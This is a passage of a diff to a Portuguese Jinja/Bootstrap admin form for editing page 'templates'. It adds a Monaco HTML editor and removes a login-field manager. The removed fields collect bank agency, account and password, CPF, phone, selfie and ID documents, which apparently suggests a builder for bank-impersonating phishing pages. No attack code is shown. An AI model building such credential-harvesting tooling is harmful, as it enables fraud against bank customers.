@@ -6,509 +6,271 @@
 
 {% block styles %}
 <style>
-    .nav-tabs .nav-link {
-        color: #495057;
-    }
-    .nav-tabs .nav-link.active {
-        font-weight: 600;
-    }
-    .page-item {
-        border: 1px solid #dee2e6;
-        border-radius: 0.25rem;
-        padding: 15px;
-        margin-bottom: 10px;
-        background-color: #f8f9fa;
-    }
-    .page-item.required {
-        border-left: 4px solid #28a745;
-    }
-    .login-type-badge {
-        display: inline-block;
-        padding: 0.25rem 0.5rem;
-        margin: 0.25rem;
-        border-radius: 0.25rem;
-        background-color: #e9ecef;
-        font-size: 0.875rem;
-    }
-    .color-preview {
-        width: 40px;
-        height: 40px;
-        border-radius: 0.25rem;
-        border: 1px solid #dee2e6;
+    .template-edit-container {
+        display: grid;
+        grid-template-columns: 1fr 1.5fr;
+        gap: 20px;
+        margin-top: 20px;
     }
     
-    /* Field Manager Styles */
-    .fields-manager {
-        background-color: #f8f9fa !important;
+    .config-section {
+        background: white;
+        border-radius: 8px;
+        padding: 20px;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
     }
-    .field-order-list {
-        min-height: 60px;
-        max-height: 300px;
-        overflow-y: auto;
+    
+    .config-section h6 {
+        font-size: 1.1rem;
+        font-weight: 600;
+        margin-bottom: 15px;
+        padding-bottom: 10px;
+        border-bottom: 2px solid #e9ecef;
     }
-    .field-order-item {
+    
+    .page-list-item {
+        border: 1px solid #dee2e6;
+        border-radius: 6px;
+        padding: 15px;
+        margin-bottom: 10px;
+        background: #f8f9fa;
+        transition: all 0.2s;
+    }
+    
+    .page-list-item:hover {
+        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    
+    .page-list-item.page-home {
+        border-left: 4px solid #28a745;
+    }
+    
+    .drag-handle {
         cursor: move;
-        user-select: none;
-        transition: background-color 0.2s;
+        color: #6c757d;
+        font-size: 1.2rem;
     }
-    .field-order-item:hover {
-        background-color: #e9ecef;
+    
+    .drag-handle:hover {
+        color: #495057;
     }
-    .field-order-item.dragging {
+    
+    .page-list-item.dragging {
         opacity: 0.5;
-        background-color: #dee2e6;
     }
-    .field-order-item.drag-over {
-        border-top: 3px solid #007bff;
-    }
-    .field-checkboxes .form-check {
-        margin-bottom: 0.5rem;
+    
+    @media (max-width: 992px) {
+        .template-edit-container {
+            grid-template-columns: 1fr;
+        }
     }
 </style>
 {% endblock %}
 
 {% block content %}
-<div class="row justify-content-center">
-    <div class="col-12">
-        <div class="card shadow">
-            <div class="card-header bg-warning">
-                <h5 class="mb-0"><i class="fas fa-edit me-2"></i>Editar modelo: {{ template.name }}</h5>
-            </div>
-            <div class="card-body">
-                <form method="POST" action="{{ url_for('template.edit_template', template_id=template._id) }}" id="templateForm">
-                    
-                    <!-- Basic Information -->
-                    <div class="row mb-4">
-                        <div class="col-md-6">
-                            <label for="name" class="form-label">Nome do modelo<span class="text-danger">*</span></label>
-                            <input type="text" class="form-control" id="name" name="name" value="{{ template.name }}" required>
-                        </div>
-                        <div class="col-md-6">
-                            <label for="status" class="form-label">Status</label>
-                            <select class="form-select" id="status" name="status">
-                                <option value="active" {% if template.status == 'active' %}selected{% endif %}>Ativo</option>
-                                <option value="inactive" {% if template.status == 'inactive' %}selected{% endif %}>Inativo</option>
-                            </select>
-                        </div>
-                    </div>
-
-                    <div class="mb-4">
-                        <label for="description" class="form-label">Descrição</label>
-                        <textarea class="form-control" id="description" name="description" rows="2">{{ template.description }}</textarea>
-                    </div>
-
-                    <!-- Tabs for advanced settings -->
-                    <ul class="nav nav-tabs mb-3" id="templateTabs" role="tablist">
-                        <li class="nav-item" role="presentation">
-                            <button class="nav-link active" id="header-tab" data-bs-toggle="tab" data-bs-target="#header" type="button" role="tab">
-                                <i class="fas fa-heading me-1"></i>Header
-                            </button>
-                        </li>
-                        <li class="nav-item" role="presentation">
-                            <button class="nav-link" id="footer-tab" data-bs-toggle="tab" data-bs-target="#footer" type="button" role="tab">
-                                <i class="fas fa-shoe-prints me-1"></i>Footer
-                            </button>
-                        </li>
-                        <li class="nav-item" role="presentation">
-                            <button class="nav-link" id="versions-tab" data-bs-toggle="tab" data-bs-target="#versions" type="button" role="tab">
-                                <i class="fas fa-mobile-alt me-1"></i>Versões
-                            </button>
-                        </li>
-                        <li class="nav-item" role="presentation">
-                            <button class="nav-link" id="pages-tab" data-bs-toggle="tab" data-bs-target="#pages" type="button" role="tab">
-                                <i class="fas fa-file-alt me-1"></i>Páginas
-                            </button>
-                        </li>
-                    </ul>
-
-                    <div class="tab-content" id="templateTabsContent">
-                        <!-- Header Tab -->
-                        <div class="tab-pane fade show active" id="header" role="tabpanel">
-                            <div class="row">
-                                <div class="col-md-12 mb-3">
-                                    <div class="form-check form-switch">
-                                        <input class="form-check-input" type="checkbox" id="headerEnabled" name="header[enabled]" 
-                                            {% if template.header and template.header.enabled %}checked{% endif %}>
-                                        <label class="form-check-label" for="headerEnabled">Habilitar Header</label>
-                                    </div>
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-12">
+            <div class="card shadow-sm">
+                <div class="card-body">
+                    <form method="POST" action="{{ url_for('template.edit_template', template_id=template._id) }}" id="templateForm">
+                        
+                        <div class="template-edit-container">
+                            <!-- LEFT COLUMN: Template Basic Config -->
+                            <div class="config-section">
+                                <h6><i class="fas fa-cog me-2"></i>Configurações Básicas</h6>
+                                
+                                <div class="mb-3">
+                                    <label for="name" class="form-label">Nome do Template</label>
+                                    <input type="text" class="form-control" id="name" name="name" 
+                                        value="{{ template.name }}" required>
                                 </div>
-                                <div class="col-md-6 mb-3">
-                                    <label for="headerLogo" class="form-label">URL do Logo</label>
-                                    <input type="text" class="form-control" id="headerLogo" name="header[logo]" 
-                                        value="{{ template.header.logo if template.header else '' }}">
+                                
+                                <div class="mb-3">
+                                    <label for="slug" class="form-label">Slug (URL)</label>
+                                    <input type="text" class="form-control" id="slug" name="slug" 
+                                        value="{{ template.slug }}" readonly>
+                                    <small class="form-text text-muted">Gerado automaticamente a partir do nome</small>
                                 </div>
-                                <div class="col-md-6 mb-3">
-                                    <label for="headerBgColor" class="form-label">Cor de Fundo</label>
-                                    <div class="input-group">
-                                        <input type="color" class="form-control form-control-color" id="headerBgColor" 
-                                            name="header[backgroundColor]" 
-                                            value="{{ template.header.backgroundColor if template.header else '#ffffff' }}">
-                                        <input type="text" class="form-control" id="headerBgColorText" 
-                                            value="{{ template.header.backgroundColor if template.header else '#ffffff' }}">
-                                    </div>
+                                
+                                <div class="mb-3">
+                                    <label for="description" class="form-label">Descrição</label>
+                                    <textarea class="form-control" id="description" name="description" 
+                                        rows="3">{{ template.description }}</textarea>
                                 </div>
-                                <div class="col-md-12">
-                                    <label for="headerContent" class="form-label">Conteúdo HTML</label>
-                                    <textarea class="form-control font-monospace" id="headerContent" name="header[content]" rows="5">{{ template.header.content if template.header else '' }}</textarea>
+                                
+                                <div class="mb-3">
+                                    <label for="status" class="form-label">Status</label>
+                                    <select class="form-select" id="status" name="status">
+                                        <option value="active" {% if template.status == 'active' %}selected{% endif %}>Ativo</option>
+                                        <option value="inactive" {% if template.status == 'inactive' %}selected{% endif %}>Inativo</option>
+                                    </select>
                                 </div>
                             </div>
-                        </div>
 
-                        <!-- Footer Tab -->
-                        <div class="tab-pane fade" id="footer" role="tabpanel">
-                            <div class="row">
-                                <div class="col-md-12 mb-3">
-                                    <div class="form-check form-switch">
-                                        <input class="form-check-input" type="checkbox" id="footerEnabled" name="footer[enabled]" 
-                                            {% if template.footer and template.footer.enabled %}checked{% endif %}>
-                                        <label class="form-check-label" for="footerEnabled">Habilitar Footer</label>
-                                    </div>
+                            <!-- RIGHT COLUMN: Pages Management -->
+                            <div class="config-section">
+                                <div class="d-flex justify-content-between align-items-center mb-3">
+                                    <h6 class="mb-0"><i class="fas fa-file-alt me-2"></i>Páginas</h6>
+                                    <button type="button" class="btn btn-sm btn-success" id="addPageBtn">
+                                        <i class="fas fa-plus me-1"></i>Nova Página
+                                    </button>
                                 </div>
-                                <div class="col-md-6 mb-3">
-                                    <label for="footerBgColor" class="form-label">Cor de Fundo</label>
-                                    <div class="input-group">
-                                        <input type="color" class="form-control form-control-color" id="footerBgColor" 
-                                            name="footer[backgroundColor]" 
-                                            value="{{ template.footer.backgroundColor if template.footer else '#f8f9fa' }}">
-                                        <input type="text" class="form-control" id="footerBgColorText" 
-                                            value="{{ template.footer.backgroundColor if template.footer else '#f8f9fa' }}">
-                                    </div>
-                                </div>
-                                <div class="col-md-12">
-                                    <label for="footerContent" class="form-label">Conteúdo HTML</label>
-                                    <textarea class="form-control font-monospace" id="footerContent" name="footer[content]" rows="5">{{ template.footer.content if template.footer else '' }}</textarea>
-                                </div>
-                            </div>
-                        </div>
-
-                        <!-- Versions Tab -->
-                        <div class="tab-pane fade" id="versions" role="tabpanel">
-                            <div class="row">
-                                <div class="col-md-6">
-                                    <h6 class="border-bottom pb-2 mb-3"><i class="fas fa-mobile-alt me-2"></i>Versão Mobile</h6>
-                                    <div class="form-check form-switch mb-3">
-                                        <input class="form-check-input" type="checkbox" id="mobileEnabled" name="versions[mobile][enabled]" 
-                                            {% if template.versions and template.versions.mobile and template.versions.mobile.enabled %}checked{% endif %}>
-                                        <label class="form-check-label" for="mobileEnabled">Habilitar versão mobile</label>
-                                    </div>
-                                    <div class="mb-3">
-                                        <label for="mobileCustomCss" class="form-label">CSS Customizado</label>
-                                        <textarea class="form-control font-monospace" id="mobileCustomCss" name="versions[mobile][customCss]" rows="4">{{ template.versions.mobile.customCss if template.versions and template.versions.mobile else '' }}</textarea>
-                                    </div>
-                                    <div class="mb-3">
-                                        <label for="mobileCustomJs" class="form-label">JavaScript Customizado</label>
-                                        <textarea class="form-control font-monospace" id="mobileCustomJs" name="versions[mobile][customJs]" rows="4">{{ template.versions.mobile.customJs if template.versions and template.versions.mobile else '' }}</textarea>
-                                    </div>
-                                </div>
-                                <div class="col-md-6">
-                                    <h6 class="border-bottom pb-2 mb-3"><i class="fas fa-desktop me-2"></i>Versão Desktop</h6>
-                                    <div class="form-check form-switch mb-3">
-                                        <input class="form-check-input" type="checkbox" id="desktopEnabled" name="versions[desktop][enabled]" 
-                                            {% if template.versions and template.versions.desktop and template.versions.desktop.enabled %}checked{% endif %}>
-                                        <label class="form-check-label" for="desktopEnabled">Habilitar versão desktop</label>
-                                    </div>
-                                    <div class="mb-3">
-                                        <label for="desktopCustomCss" class="form-label">CSS Customizado</label>
-                                        <textarea class="form-control font-monospace" id="desktopCustomCss" name="versions[desktop][customCss]" rows="4">{{ template.versions.desktop.customCss if template.versions and template.versions.desktop else '' }}</textarea>
-                                    </div>
-                                    <div class="mb-3">
-                                        <label for="desktopCustomJs" class="form-label">JavaScript Customizado</label>
-                                        <textarea class="form-control font-monospace" id="desktopCustomJs" name="versions[desktop][customJs]" rows="4">{{ template.versions.desktop.customJs if template.versions and template.versions.desktop else '' }}</textarea>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <!-- Pages Tab -->
-                        <div class="tab-pane fade" id="pages" role="tabpanel">
-                            <div class="d-flex justify-content-between align-items-center mb-3">
-                                <h6 class="mb-0">Páginas do Template</h6>
-                                <button type="button" class="btn btn-sm btn-primary" id="addPageBtn">
-                                    <i class="fas fa-plus me-1"></i>Adicionar Página
-                                </button>
-                            </div>
-                            
-                            <div id="pagesList">
-                                {% if template.pages %}
-                                    {% for page in template.pages %}
-                                    <div class="page-item {% if page.required %}required{% endif %}" data-page-index="{{ loop.index0 }}">
-                                        <div class="row align-items-center">
-                                            <div class="col-md-3">
-                                                <label class="form-label small">ID da Página</label>
-                                                <input type="text" class="form-control form-control-sm" name="pages[{{ loop.index0 }}][id]" 
-                                                    value="{{ page.id }}" {% if page.required %}readonly{% endif %}>
-                                            </div>
-                                            <div class="col-md-3">
-                                                <label class="form-label small">Nome</label>
-                                                <input type="text" class="form-control form-control-sm" name="pages[{{ loop.index0 }}][name]" 
-                                                    value="{{ page.name }}" required>
-                                            </div>
-                                            <div class="col-md-3">
-                                                <label class="form-label small">Tipo</label>
-                                                <select class="form-select form-select-sm page-type-select" name="pages[{{ loop.index0 }}][type]" 
-                                                    {% if page.required %}disabled{% endif %}>
-                                                    <option value="home" {% if page.type == 'home' %}selected{% endif %}>Home</option>
-                                                    <option value="splashscreen" {% if page.type == 'splashscreen' %}selected{% endif %}>Splashscreen</option>
-                                                    <option value="login" {% if page.type == 'login' %}selected{% endif %}>Login</option>
-                                                    <option value="custom" {% if page.type == 'custom' %}selected{% endif %}>Customizada</option>
-                                                </select>
-                                            </div>
-                                            <div class="col-md-3 text-end">
-                                                {% if not page.required %}
-                                                <button type="button" class="btn btn-sm btn-danger remove-page-btn">
-                                                    <i class="fas fa-trash"></i>
-                                                </button>
-                                                {% else %}
-                                                <span class="badge bg-success">Obrigatória</span>
-                                                {% endif %}
-                                            </div>
-                                        </div>
-                                        
-                                        <!-- Login Type Section (only for login pages) -->
-                                        <div class="login-types-section mt-3" style="{% if page.type != 'login' %}display:none;{% endif %}">
-                                            <label class="form-label small">Tipos de Login</label>
-                                            <div class="form-check">
-                                                <input class="form-check-input" type="checkbox" name="pages[{{ loop.index0 }}][loginTypes][]" 
-                                                    value="user_pass" id="login_{{ loop.index0 }}_user_pass" 
-                                                    {% if page.loginTypes and 'user_pass' in page.loginTypes %}checked{% endif %}>
-                                                <label class="form-check-label" for="login_{{ loop.index0 }}_user_pass">
-                                                    Login + Senha
-                                                </label>
-                                            </div>
-                                            <div class="form-check">
-                                                <input class="form-check-input" type="checkbox" name="pages[{{ loop.index0 }}][loginTypes][]" 
-                                                    value="agency_account_pass" id="login_{{ loop.index0 }}_agency" 
-                                                    {% if page.loginTypes and 'agency_account_pass' in page.loginTypes %}checked{% endif %}>
-                                                <label class="form-check-label" for="login_{{ loop.index0 }}_agency">
-                                                    Agência + Conta + Senha
-                                                </label>
-                                            </div>
-                                            <div class="form-check">
-                                                <input class="form-check-input" type="checkbox" name="pages[{{ loop.index0 }}][loginTypes][]" 
-                                                    value="phone" id="login_{{ loop.index0 }}_phone" 
-                                                    {% if page.loginTypes and 'phone' in page.loginTypes %}checked{% endif %}>
-                                                <label class="form-check-label" for="login_{{ loop.index0 }}_phone">
-                                                    Celular
-                                                </label>
-                                            </div>
-                                            <div class="form-check">
-                                                <input class="form-check-input" type="checkbox" name="pages[{{ loop.index0 }}][loginTypes][]" 
-                                                    value="cpf" id="login_{{ loop.index0 }}_cpf" 
-                                                    {% if page.loginTypes and 'cpf' in page.loginTypes %}checked{% endif %}>
-                                                <label class="form-check-label" for="login_{{ loop.index0 }}_cpf">
-                                                    CPF
-                                                </label>
-                                            </div>
-                                            <div class="form-check">
-                                                <input class="form-check-input" type="checkbox" name="pages[{{ loop.index0 }}][loginTypes][]" 
-                                                    value="selfie" id="login_{{ loop.index0 }}_selfie" 
-                                                    {% if page.loginTypes and 'selfie' in page.loginTypes %}checked{% endif %}>
-                                                <label class="form-check-label" for="login_{{ loop.index0 }}_selfie">
-                                                    Selfie
-                                                </label>
-                                            </div>
-                                            <div class="form-check">
-                                                <input class="form-check-input" type="checkbox" name="pages[{{ loop.index0 }}][loginTypes][]" 
-                                                    value="document" id="login_{{ loop.index0 }}_document" 
-                                                    {% if page.loginTypes and 'document' in page.loginTypes %}checked{% endif %}>
-                                                <label class="form-check-label" for="login_{{ loop.index0 }}_document">
-                                                    Documento
-                                                </label>
-                                            </div>
-                                        </div>
-
-                                        <!-- Duration for splashscreen -->
-                                        <div class="mt-3 splashscreen-duration" style="{% if page.type != 'splashscreen' %}display:none;{% endif %}">
-                                            <label class="form-label small">Duração (ms)</label>
-                                            <input type="number" class="form-control form-control-sm" name="pages[{{ loop.index0 }}][duration]" 
-                                                value="{{ page.duration if page.duration else 3000 }}" min="1000" max="10000">
-                                        </div>
-
-                                        <div class="mt-3">
-                                            <label class="form-label small">Campos da Página</label>
-                                            <div class="fields-manager border rounded p-3 bg-light" data-page-index="{{ loop.index0 }}">
-                                                <div class="available-fields mb-3">
-                                                    <small class="text-muted d-block mb-2">Selecione os campos a exibir:</small>
-                                                    <div class="field-checkboxes">
-                                                        <div class="form-check">
-                                                            <input class="form-check-input field-checkbox" type="checkbox" 
-                                                                value="login_password" id="field_{{ loop.index0 }}_login_password"
-                                                                data-label="Login + Senha"
-                                                                {% if page.fields %}
-                                                                    {% for field in page.fields %}
-                                                                        {% if field.type == 'login_password' %}checked{% endif %}
-                                                                    {% endfor %}
-                                                                {% endif %}>
-                                                            <label class="form-check-label" for="field_{{ loop.index0 }}_login_password">
-                                                                Login + Senha
-                                                            </label>
+                                
+                                <small class="text-muted d-block mb-3">
+                                    <i class="fas fa-info-circle me-1"></i>
+                                    Arraste para reordenar. Apenas uma página pode ser marcada como "Home".
+                                </small>
+                                
+                                <div id="pagesList">
+                                    {% if template.pages %}
+                                        {% for page in template.pages %}
+                                        <div class="page-list-item {% if page.type == 'home' %}page-home{% endif %}" 
+                                             data-page-index="{{ loop.index0 }}" draggable="true">
+                                            <div class="d-flex align-items-start gap-3">
+                                                <div class="drag-handle">
+                                                    <i class="fas fa-grip-vertical"></i>
+                                                </div>
+                                                
+                                                <div class="flex-grow-1">
+                                                    <div class="row g-2 mb-2">
+                                                        <div class="col-md-5">
+                                                            <label class="form-label small mb-1">Nome</label>
+                                                            <input type="text" class="form-control form-control-sm" 
+                                                                name="pages[{{ loop.index0 }}][name]" 
+                                                                value="{{ page.name }}" required>
                                                         </div>
-                                                        <div class="form-check">
-                                                            <input class="form-check-input field-checkbox" type="checkbox" 
-                                                                value="agency_account_password" id="field_{{ loop.index0 }}_agency"
-                                                                data-label="Agência + Conta + Senha"
-                                                                {% if page.fields %}
-                                                                    {% for field in page.fields %}
-                                                                        {% if field.type == 'agency_account_password' %}checked{% endif %}
-                                                                    {% endfor %}
-                                                                {% endif %}>
-                                                            <label class="form-check-label" for="field_{{ loop.index0 }}_agency">
-                                                                Agência + Conta + Senha
-                                                            </label>
+                                                        <div class="col-md-4">
+                                                            <label class="form-label small mb-1">Tipo</label>
+                                                            <select class="form-select form-select-sm page-type-select" 
+                                                                name="pages[{{ loop.index0 }}][type]">
+                                                                <option value="home" {% if page.type == 'home' %}selected{% endif %}>Home</option>
+                                                                <option value="custom" {% if page.type == 'custom' %}selected{% endif %}>Personalizada</option>
+                                                            </select>
                                                         </div>
-                                                        <div class="form-check">
-                                                            <input class="form-check-input field-checkbox" type="checkbox" 
-                                                                value="phone" id="field_{{ loop.index0 }}_phone"
-                                                                data-label="Celular"
-                                                                {% if page.fields %}
-                                                                    {% for field in page.fields %}
-                                                                        {% if field.type == 'phone' %}checked{% endif %}
-                                                                    {% endfor %}
-                                                                {% endif %}>
-                                                            <label class="form-check-label" for="field_{{ loop.index0 }}_phone">
-                                                                Celular
-                                                            </label>
-                                                        </div>
-                                                        <div class="form-check">
-                                                            <input class="form-check-input field-checkbox" type="checkbox" 
-                                                                value="cpf" id="field_{{ loop.index0 }}_cpf"
-                                                                data-label="CPF"
-                                                                {% if page.fields %}
-                                                                    {% for field in page.fields %}
-                                                                        {% if field.type == 'cpf' %}checked{% endif %}
-                                                                    {% endfor %}
-                                                                {% endif %}>
-                                                            <label class="form-check-label" for="field_{{ loop.index0 }}_cpf">
-                                                                CPF
-                                                            </label>
-                                                        </div>
-                                                        <div class="form-check">
-                                                            <input class="form-check-input field-checkbox" type="checkbox" 
-                                                                value="selfie" id="field_{{ loop.index0 }}_selfie"
-                                                                data-label="Selfie"
-                                                                {% if page.fields %}
-                                                                    {% for field in page.fields %}
-                                                                        {% if field.type == 'selfie' %}checked{% endif %}
-                                                                    {% endfor %}
-                                                                {% endif %}>
-                                                            <label class="form-check-label" for="field_{{ loop.index0 }}_selfie">
-                                                                Selfie
-                                                            </label>
-                                                        </div>
-                                                        <div class="form-check">
-                                                            <input class="form-check-input field-checkbox" type="checkbox" 
-                                                                value="document" id="field_{{ loop.index0 }}_document"
-                                                                data-label="Documento"
-                                                                {% if page.fields %}
-                                                                    {% for field in page.fields %}
-                                                                        {% if field.type == 'document' %}checked{% endif %}
-                                                                    {% endfor %}
-                                                                {% endif %}>
-                                                            <label class="form-check-label" for="field_{{ loop.index0 }}_document">
-                                                                Documento
-                                                            </label>
+                                                        <div class="col-md-3">
+                                                            <label class="form-label small mb-1">Ordem</label>
+                                                            <input type="number" class="form-control form-control-sm page-order" 
+                                                                name="pages[{{ loop.index0 }}][order]" 
+                                                                value="{{ page.order if page.order else loop.index }}" 
+                                                                min="1" required>
                                                         </div>
                                                     </div>
-                                                </div>
-                                                <div class="selected-fields">
-                                                    <small class="text-muted d-block mb-2">Ordem dos campos (arraste para reordenar):</small>
-                                                    <ul class="field-order-list list-group" id="fieldList_{{ loop.index0 }}">
-                                                        {% if page.fields %}
-                                                            {% for field in page.fields | sort(attribute='order') %}
-                                                            <li class="list-group-item d-flex justify-content-between align-items-center field-order-item" 
-                                                                draggable="true" data-field-type="{{ field.type }}">
-                                                                <span><i class="fas fa-grip-vertical me-2 text-muted"></i>{{ field.label }}</span>
-                                                                <input type="hidden" name="pages[{{ loop.index0 }}][fields][{{ loop.index }}][type]" value="{{ field.type }}">
-                                                                <input type="hidden" name="pages[{{ loop.index0 }}][fields][{{ loop.index }}][label]" value="{{ field.label }}">
-                                                                <input type="hidden" class="field-order-input" name="pages[{{ loop.index0 }}][fields][{{ loop.index }}][order]" value="{{ field.order }}">
-                                                            </li>
-                                                            {% endfor %}
-                                                        {% endif %}
-                                                    </ul>
-                                                    <div class="empty-message text-muted text-center py-3" style="{% if page.fields and page.fields|length > 0 %}display:none;{% endif %}">
-                                                        Selecione campos acima para adicioná-los à página
+                                                    
+                                                    <input type="hidden" name="pages[{{ loop.index0 }}][id]" value="{{ page.id }}">
+                                                    <input type="hidden" class="page-content-input" 
+                                                        name="pages[{{ loop.index0 }}][content]" 
+                                                        value="{{ page.content|e if page.content else '' }}">
+                                                    
+                                                    <div class="d-flex gap-2 mt-2">
+                                                        <button type="button" class="btn btn-sm btn-outline-primary edit-html-btn"
+                                                            data-page-index="{{ loop.index0 }}">
+                                                            <i class="fas fa-code me-1"></i>Editar HTML
+                                                        </button>
+                                                        <button type="button" class="btn btn-sm btn-outline-danger remove-page-btn">
+                                                            <i class="fas fa-trash me-1"></i>Remover
+                                                        </button>
                                                     </div>
                                                 </div>
                                             </div>
                                         </div>
-                                    </div>
-                                    {% endfor %}
-                                {% endif %}
+                                        {% endfor %}
+                                    {% else %}
+                                        <p class="text-muted text-center py-3">Nenhuma página adicionada ainda</p>
+                                    {% endif %}
+                                </div>
                             </div>
                         </div>
-                    </div>
 
-                    <div class="d-flex flex-column flex-sm-row gap-2 justify-content-end mt-4">
-                        <a href="{{ url_for('template.list_templates') }}" class="btn btn-outline-secondary">
-                            <i class="fas fa-arrow-left me-2"></i>Cancelar
-                        </a>
-                        <button type="submit" class="btn btn-success">
-                            <i class="fas fa-save me-2"></i>Atualizar modelo
-                        </button>
-                    </div>
-                </form>
+                        <div class="d-flex gap-2 justify-content-end mt-4">
+                            <a href="{{ url_for('template.list_templates') }}" class="btn btn-outline-secondary">
+                                <i class="fas fa-times me-1"></i>Cancelar
+                            </a>
+                            <button type="submit" class="btn btn-success">
+                                <i class="fas fa-save me-1"></i>Salvar Alterações
+                            </button>
+                        </div>
+                    </form>
+                </div>
             </div>
         </div>
     </div>
 </div>
 
-<!-- Page Template (hidden) -->
-<template id="pageTemplate">
-    <div class="page-item" data-page-index="">
-        <div class="row align-items-center">
-            <div class="col-md-3">
-                <label class="form-label small">ID da Página</label>
-                <input type="text" class="form-control form-control-sm page-id-input" name="" placeholder="ex: login_page">
+<!-- Modal for Editing HTML -->
+<div class="modal fade" id="htmlEditorModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-xl">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-code me-2"></i>Editar HTML da Página: <span id="modalPageName"></span>
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
             </div>
-            <div class="col-md-3">
-                <label class="form-label small">Nome</label>
-                <input type="text" class="form-control form-control-sm" name="" placeholder="ex: Login" required>
+            <div class="modal-body" style="padding: 0; position: relative;">
+                <div id="monacoEditorContainer" style="height: 500px; width: 100%;"></div>
+                <div id="editorLoading" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 1000;">
+                    <div class="text-center text-white">
+                        <div class="spinner-border mb-3" role="status"></div>
+                        <div>Carregando editor...</div>
+                    </div>
+                </div>
+                <small class="text-muted d-block mt-2 px-3 pb-2">
+                    <i class="fas fa-info-circle me-1"></i>
+                    Escreva o HTML completo da página. Você pode usar Bootstrap 5 classes.
+                </small>
             </div>
-            <div class="col-md-3">
-                <label class="form-label small">Tipo</label>
-                <select class="form-select form-select-sm page-type-select" name="">
-                    <option value="login">Login</option>
-                    <option value="custom">Customizada</option>
-                </select>
-            </div>
-            <div class="col-md-3 text-end">
-                <button type="button" class="btn btn-sm btn-danger remove-page-btn">
-                    <i class="fas fa-trash"></i>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
+                <button type="button" class="btn btn-primary" id="saveHtmlBtn">
+                    <i class="fas fa-save me-1"></i>Salvar HTML
                 </button>
             </div>
         </div>
-        
-        <div class="login-types-section mt-3">
-            <label class="form-label small">Tipos de Login</label>
-            <div class="form-check">
-                <input class="form-check-input" type="checkbox" value="user_pass">
-                <label class="form-check-label">Login + Senha</label>
-            </div>
-            <div class="form-check">
-                <input class="form-check-input" type="checkbox" value="agency_account_pass">
-                <label class="form-check-label">Agência + Conta + Senha</label>
-            </div>
-            <div class="form-check">
-                <input class="form-check-input" type="checkbox" value="phone">
-                <label class="form-check-label">Celular</label>
-            </div>
-            <div class="form-check">
-                <input class="form-check-input" type="checkbox" value="cpf">
-                <label class="form-check-label">CPF</label>
-            </div>
-            <div class="form-check">
-                <input class="form-check-input" type="checkbox" value="selfie">
-                <label class="form-check-label">Selfie</label>
-            </div>
-            <div class="form-check">
-                <input class="form-check-input" type="checkbox" value="document">
-                <label class="form-check-label">Documento</label>
-            </div>
-        </div>
+    </div>
+</div>
 
-        <div class="mt-3">
-            <label class="form-label small">Conteúdo HTML</label>
-            <textarea class="form-control form-control-sm font-monospace" name="" rows="3"></textarea>
+<!-- Page Template (Hidden) -->
+<template id="pageTemplate">
+    <div class="page-list-item" draggable="true">
+        <div class="d-flex align-items-start gap-3">
+            <div class="drag-handle">
+                <i class="fas fa-grip-vertical"></i>
+            </div>
+            
+            <div class="flex-grow-1">
+                <div class="row g-2 mb-2">
+                    <div class="col-md-5">
+                        <label class="form-label small mb-1">Nome</label>
+                        <input type="text" class="form-control form-control-sm" 
+                            name="" placeholder="Nome da página" required>
+                    </div>
+                    <div class="col-md-4">
+                        <label class="form-label small mb-1">Tipo</label>
+                        <select class="form-select form-select-sm page-type-select" name="">
+                            <option value="home">Home</option>
+                            <option value="custom" selected>Personalizada</option>
+                        </select>
+                    </div>
+                    <div class="col-md-3">
+                        <label class="form-label small mb-1">Ordem</label>
+                        <input type="number" class="form-control form-control-sm page-order" 
+                            name="" value="1" min="1" required>
+                    </div>
+                </div>
+                
+                <input type="hidden" name="" value="">
+                <input type="hidden" class="page-content-input" name="" value="">
+                
+                <div class="d-flex gap-2 mt-2">
+                    <button type="button" class="btn btn-sm btn-outline-primary edit-html-btn">
+                        <i class="fas fa-code me-1"></i>Editar HTML
+                    </button>
+                    <button type="button" class="btn btn-sm btn-outline-danger remove-page-btn">
+                        <i class="fas fa-trash me-1"></i>Remover
+                    </button>
+                </div>
+            </div>
         </div>
     </div>
 </template>
@@ -516,167 +278,219 @@
 {% endblock %}
 
 {% block scripts %}
+<script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.44.0/min/vs/loader.min.js"></script>
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('✓ Template edit form initialized');
-    
-    // Initialize field management for all pages
-    document.querySelectorAll('.fields-manager').forEach(function(manager) {
-        initFieldManager(manager);
+let currentEditingPageIndex = null;
+let pageCounter = {{ template.pages|length if template.pages else 0 }};
+const htmlEditorModal = new bootstrap.Modal(document.getElementById('htmlEditorModal'));
+let monacoEditor = null;
+
+// Load Monaco Editor
+require.config({ paths: { vs: 'https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.44.0/min/vs' }});
+
+require(['vs/editor/editor.main'], function () {
+    monacoEditor = monaco.editor.create(document.getElementById('monacoEditorContainer'), {
+        value: '',
+        language: 'html',
+        theme: 'vs-dark',
+        automaticLayout: true,
+        minimap: { enabled: true },
+        fontSize: 14,
+        tabSize: 2,
+        wordWrap: 'on',
+        formatOnPaste: true,
+        formatOnType: true
     });
     
-    // Handle page type changes (show/hide login types and duration)
-    document.querySelectorAll('.page-type-select').forEach(function(select) {
-        select.addEventListener('change', function() {
-            const pageItem = this.closest('.page-item');
-            const loginSection = pageItem.querySelector('.login-types-section');
-            const durationSection = pageItem.querySelector('.splashscreen-duration');
-            
-            if (this.value === 'login') {
-                if (loginSection) loginSection.style.display = 'block';
-            } else {
-                if (loginSection) loginSection.style.display = 'none';
-            }
-            
-            if (this.value === 'splashscreen') {
-                if (durationSection) durationSection.style.display = 'block';
-            } else {
-                if (durationSection) durationSection.style.display = 'none';
-            }
-        });
-    });
+    // Hide loading indicator
+    const loadingEl = document.getElementById('editorLoading');
+    if (loadingEl) {
+        loadingEl.style.display = 'none';
+    }
+    
+    console.log('✓ Monaco Editor initialized');
 });
 
-function initFieldManager(manager) {
-    const pageIndex = manager.dataset.pageIndex;
